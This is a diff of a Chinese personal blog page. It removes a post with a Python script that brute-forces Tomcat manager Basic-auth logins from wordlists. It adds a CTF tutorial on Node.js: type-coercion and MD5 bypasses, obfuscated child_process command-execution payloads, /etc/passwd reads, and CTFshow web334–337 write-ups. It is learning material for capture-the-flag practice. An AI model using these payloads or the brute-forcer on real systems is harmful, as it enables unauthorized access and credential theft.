@@ -5,7 +5,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hoylindo || Python爆破tomcat</title>
+    <title>Hoylindo || CTF中的Nodejs</title>
     <meta name="author" content="hoylindo">
     <meta name="description" content="嗨，这里是一个搭建的不太熟练的小破站 ">
     <meta name="keywords" content=" ">
@@ -153,14 +153,14 @@
 <link rel="stylesheet" href="/css/post-body.css">
 <div class="article">
     <div>
-        <h1>Python爆破tomcat </h1>
+        <h1>CTF中的Nodejs </h1>
     </div>
     <div class="info">
         <span class="date">
             <span class="icon">
                 <a-icon type="calendar" theme="filled" />
             </span>
-            2022/9/3
+            2023/2/15
         </span>
 
         
@@ -183,8 +183,8 @@
             
             <span class="tag">
                 
-                <a href="/tags/Python" style=color:#1bccbc>
-                    Python
+                <a href="/tags/Nodejs" style=color:#00bcd4>
+                    Nodejs
                 </a>
             </span>
             
@@ -197,71 +197,179 @@
 
 <span id="more"></span>
 
-<h3 id="一个并不美好的开头"><a href="#一个并不美好的开头" class="headerlink" title="一个并不美好的开头"></a>一个并不美好的开头</h3><ul>
-<li>服务搭了快一辈子，最后不知道怎么回事自己莫名其妙就搭上了，明明点那个bat文件疯狂闪退的</li>
-<li>和bp撞了端口又去改掉了端口，然后设置了一下密码</li>
-<li>终于终于终于，可以开始进入正题了</li>
+<h2 id="Nodejs语言特性"><a href="#Nodejs语言特性" class="headerlink" title="Nodejs语言特性"></a>Nodejs语言特性</h2><h3 id="大小写特性"><a href="#大小写特性" class="headerlink" title="大小写特性"></a>大小写特性</h3><ul>
+<li>大写转换<code>toUpperCase()</code>：字符<code>ı ſ</code>经过<code>toUpperCase</code>处理后结果为<code>I S</code></li>
+<li>小写转换<code>toLowerCase()</code>：字符<code>K İ </code>经过<code>toLowerCase</code>处理后结果为<code>k i </code></li>
 </ul>
-<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ul>
-<li>bp抓包可以看到，输入的用户名和密码被组合成：<code>[用户名]:[密码]</code>的形式然后被base64加密了</li>
-<li>丢到Intruder里，随便写几个爆破一下，可以看到返回的状态码是不一样的，这就好办多啦</li>
-<li>这里还要注意一个是，数据是在请求头里传输的：<code>Authorization: Basic MTExMToxMTExMQ==</code></li>
-</ul>
-<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ul>
-<li>首先处理请求头，把<code>username</code>和<code>password</code>通过<code>:</code>拼接后进行base64编码</li>
-<li>还要记得和<code>Basic[空格]</code>拼接，惨痛的教训</li>
-<li>然后定义一个函数发送一个get请求，并传输构造的请求头，获取返回的状态码</li>
-<li>循环逐行读入<code>username</code>和<code>password</code>，判断返回的状态码是否为<code>200</code></li>
-<li>这里还要注意返回的状态码是int型，不要和<code>&#39;200&#39;</code>去比较，不然这辈子都跑不出来，惨痛的教训+1+1+1</li>
-<li>总之这个可比爆破phpmyadmin简单哆啦</li>
-</ul>
-<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><pre><code class="python">import requests
-import base64
-
-url = &#39;http://127.0.0.1:9999/manager/html&#39;
-
-
-def set_header(username, password):
-    t = username + &#39;:&#39; + password
-    authorization = &#39;Basic &#39; + str(base64.b64encode(t.encode(&#39;utf-8&#39;)), &#39;utf-8&#39;)
-    # print(authorization)
-    h = &#123;&#39;Authorization&#39;: authorization&#125;
-    return h
-
-
-def get_status_code(h):
-    r = requests.get(url=url, headers=h)
-    return r.status_code
-
-
-def start_attacking():
-    try:
-        with open(&#39;user.txt&#39;, &#39;r+&#39;) as u:
-            for i in u:
-                with open(&#39;password.txt&#39;, &#39;r+&#39;) as p:
-                    for j in p:
-                        user = i.strip()
-                        password = j.strip()
-                        h = set_header(user, password)
-                        r = get_status_code(h)
-                        if r == 200:
-                            print(&#39;Success! username: &#39; + user + &#39; | password: &#39; + password)
-                            return 1
-                        else:
-                            pass
-    except Exception as e:
-        print(e.args)
-        return -1
-    return 0
-
-
-if __name__ == &quot;__main__&quot;:
-    rs = start_attacking()
-    if rs == 0:
-        print(&#39;Fail! No matching user and password were found in the files.&#39;)
-    else:
-        pass
+<h3 id="弱类型比较"><a href="#弱类型比较" class="headerlink" title="弱类型比较"></a>弱类型比较</h3><ul>
+<li><p>数字与字符串比较时，会优先将纯数字型字符串转为数字之后再进行比较</p>
+</li>
+<li><p>字符串与字符串比较时，会将字符串的第一个字符转为ASCII码之后再进行比较</p>
+</li>
+<li><p>非数字型字符串与数字进行任何比较结果都是<code>false</code></p>
+<pre><code class="javascript">console.log(1==&#39;1&#39;); //true 
+console.log(1&gt;&#39;2&#39;); //false 
+console.log(&#39;1&#39;&lt;&#39;2&#39;); //true 
+console.log(111&gt;&#39;3&#39;); //true 
+console.log(&#39;111&#39;&gt;&#39;3&#39;); //false 
+console.log(&#39;asd&#39;&gt;1); //false
 </code></pre>
+</li>
+<li><p>空数组之间比较永远为false</p>
+</li>
+<li><p>数组之间比较只比较数组的第一个值，对第一个值采用上面的比较方法</p>
+</li>
+<li><p>数组与非数值型字符串比较，数组永远小于非数值型字符串</p>
+</li>
+<li><p>数组与数值型字符串比较，取第一个之后按前面总结的方法进行比较</p>
+<pre><code class="javascript">console.log([]==[]); //false 
+console.log([]&gt;[]); //false
+console.log([6,2]&gt;[5]); //true 
+console.log([100,2]&lt;&#39;test&#39;); //true 
+console.log([1,2]&lt;&#39;2&#39;);  //true 
+console.log([11,16]&lt;&quot;10&quot;); //false
+</code></pre>
+</li>
+<li><p>一些特殊的相等：</p>
+<pre><code class="javascript">console.log(null==undefined) // 输出：true 
+console.log(null===undefined) // 输出：false 
+console.log(NaN==NaN)  // 输出：false 
+console.log(NaN===NaN)  // 输出：false
+</code></pre>
+</li>
+<li><p>变量拼接：</p>
+<pre><code class="javascript">console.log(5+[6,6]); //56,6
+console.log(&quot;5&quot;+6); //56 
+console.log(&quot;5&quot;+[6,6]); //56,6 
+console.log(&quot;5&quot;+[&quot;6&quot;,&quot;6&quot;]); //56,6
+</code></pre>
+</li>
+</ul>
+<h3 id="MD5绕过"><a href="#MD5绕过" class="headerlink" title="MD5绕过"></a>MD5绕过</h3><ul>
+<li><p>跟php很像的数组绕过</p>
+</li>
+<li><p>如：</p>
+<pre><code class="javascript">a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag)
+</code></pre>
+</li>
+<li><p>payload：<code>a[x]=1&amp;b[x]=2</code>，数组会被解析成<code>[object Object]</code></p>
+</li>
+</ul>
+<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><ul>
+<li><p>16进制编码：<code>console.log(&quot;a&quot;===&quot;\x61&quot;); // true</code></p>
+</li>
+<li><p>unicode编码：<code>console.log(&quot;\u0061&quot;===&quot;a&quot;); // true</code></p>
+</li>
+<li><p>base编码：<code>eval(Buffer.from(&#39;Y29uc29sZS5sb2coImhhaGFoYWhhIik7&#39;,&#39;base64&#39;).toString())</code></p>
+</li>
+</ul>
+<h2 id="Nodejs危险函数的利用"><a href="#Nodejs危险函数的利用" class="headerlink" title="Nodejs危险函数的利用"></a>Nodejs危险函数的利用</h2><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><ul>
+<li><p>**exec()**：</p>
+<pre><code class="javascript">require(&#39;child_process&#39;).exec(&#39;open /System/Applications/Calculator.app&#39;);
+</code></pre>
+</li>
+<li><p>**eval()**：</p>
+<pre><code class="javascript">console.log(eval(&quot;document.cookie&quot;)); //执行document.cookie
+console.log(&quot;document.cookie&quot;); //输出document.cookie
+</code></pre>
+</li>
+</ul>
+<h3 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h3><ul>
+<li><p>读：</p>
+<ul>
+<li><p>**readFile()**：</p>
+<pre><code class="javascript">require(&#39;fs&#39;).readFile(&#39;/etc/passwd&#39;, &#39;utf-8&#39;, (err, data) =&gt; &#123;
+ if (err) throw err;
+ console.log(data);
+&#125;);
+</code></pre>
+</li>
+<li><p>**readFileSync()**：</p>
+<pre><code class="javascript">require(&#39;fs&#39;).readFileSync(&#39;/etc/passwd&#39;,&#39;utf-8&#39;)
+</code></pre>
+</li>
+</ul>
+</li>
+<li><p>写：</p>
+<ul>
+<li><p>**writeFileSync()**：</p>
+<pre><code class="javascript">require(&#39;fs&#39;).writeFileSync(&#39;input.txt&#39;,&#39;sss&#39;);
+</code></pre>
+</li>
+<li><p>**writeFile()**：</p>
+<pre><code class="javascript">require(&#39;fs&#39;).writeFile(&#39;input.txt&#39;,&#39;test&#39;,(err)=&gt;&#123;&#125;)
+</code></pre>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h3><ul>
+<li><p>原型：</p>
+<pre><code class="javascript">require(&quot;child_process&quot;).execSync(&#39;cat flag.txt&#39;)
+</code></pre>
+</li>
+<li><p>字符拼接：</p>
+<pre><code class="javascript">require(&quot;child_process&quot;)[&#39;exe&#39;%2b&#39;cSync&#39;](&#39;cat flag.txt&#39;)//(%2b就是+的url编码)
+require(&#39;child_process&#39;)[&quot;exe&quot;.concat(&quot;cSync&quot;)](&quot;cat flag.txt&quot;)
+</code></pre>
+</li>
+<li><p>编码绕过：</p>
+<pre><code class="javascript">require(&quot;child_process&quot;)[&quot;\x65\x78\x65\x63\x53\x79\x6e\x63&quot;](&#39;cat flag.txt&#39;)
+require(&quot;child_process&quot;)[&quot;\u0065\u0078\u0065\u0063\u0053\x79\x6e\x63&quot;](&#39;cat flag.txt&#39;)
+eval(Buffer.from(&#39;cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCdjYXQgZmxhZy50eHQnKTs=&#39;,&#39;base64&#39;).toString())
+</code></pre>
+</li>
+<li><p>模板拼接：</p>
+<pre><code class="javascript">require(&quot;child_process&quot;)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](&#39;cat flag.txt&#39;）
+</code></pre>
+</li>
+<li><p>其他函数：</p>
+<pre><code class="javascript">require(&quot;child_process&quot;).exec(&quot;sleep 3&quot;); 
+require(&quot;child_process&quot;).execSync(&quot;sleep 3&quot;); 
+require(&quot;child_process&quot;).execFile(&quot;/bin/sleep&quot;,[&quot;3&quot;]); *//调用某个可执行文件，在第二个参数传args* 
+require(&quot;child_process&quot;).spawn(&#39;sleep&#39;, [&#39;3&#39;]); 
+require(&quot;child_process&quot;).spawnSync(&#39;sleep&#39;, [&#39;3&#39;]); 
+require(&quot;child_process&quot;).execFileSync(&#39;sleep&#39;, [&#39;3&#39;])
+</code></pre>
+</li>
+</ul>
+<h2 id="CTFSHOW-Nodejs-wp"><a href="#CTFSHOW-Nodejs-wp" class="headerlink" title="CTFSHOW-Nodejs-wp"></a>CTFSHOW-Nodejs-wp</h2><h3 id="web334"><a href="#web334" class="headerlink" title="web334"></a>web334</h3><ul>
+<li><p>源码里给了用户名和密码：</p>
+<pre><code class="javascript">module.exports = &#123;
+  items: [
+    &#123;username: &#39;CTFSHOW&#39;, password: &#39;123456&#39;&#125;
+  ]
+&#125;;
+</code></pre>
+</li>
+<li><p>然后还有一个校验：</p>
+<pre><code class="javascript">var findUser = function(name, password)&#123;
+  return users.find(function(item)&#123;
+    return name!==&#39;CTFSHOW&#39; &amp;&amp; item.username === name.toUpperCase() &amp;&amp; item.password === password;
+  &#125;);
+&#125;;
+</code></pre>
+</li>
+<li><p>利用<code>ſ</code>经过<code>toUpperCase</code>处理后结果为<code>S</code>，直接构造用户名：<code>CTFſHOW</code>登录得到flag</p>
+</li>
+</ul>
+<h3 id="web335"><a href="#web335" class="headerlink" title="web335"></a>web335</h3><ul>
+<li>源码里找到注释：<code> &lt;!-- /?eval= --&gt;</code></li>
+<li>应该是可以命令执行，payload：<code>?eval=require(&quot;child_process&quot;).execSync(&#39;cat fl00g.txt&#39;)</code></li>
+</ul>
+<h3 id="web336"><a href="#web336" class="headerlink" title="web336"></a>web336</h3><ul>
+<li>payload：<code>?eval=require(&quot;child_process&quot;)[&#39;exe&#39;+&#39;cSync&#39;](&#39;cat fl001g.txt&#39;)</code></li>
+</ul>
+<h3 id="web337"><a href="#web337" class="headerlink" title="web337"></a>web337</h3><ul>
+<li><p>给了源码：</p>
+<pre><code class="javascript">if(a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag))&#123;
+      res.end(flag);
+  &#125;
+</code></pre>
+</li>
+<li><p>MD5绕过，payload：<code>/?a[x]=1&amp;b[x]=2</code></p>
+</li>
+</ul>
 
     </div>
 
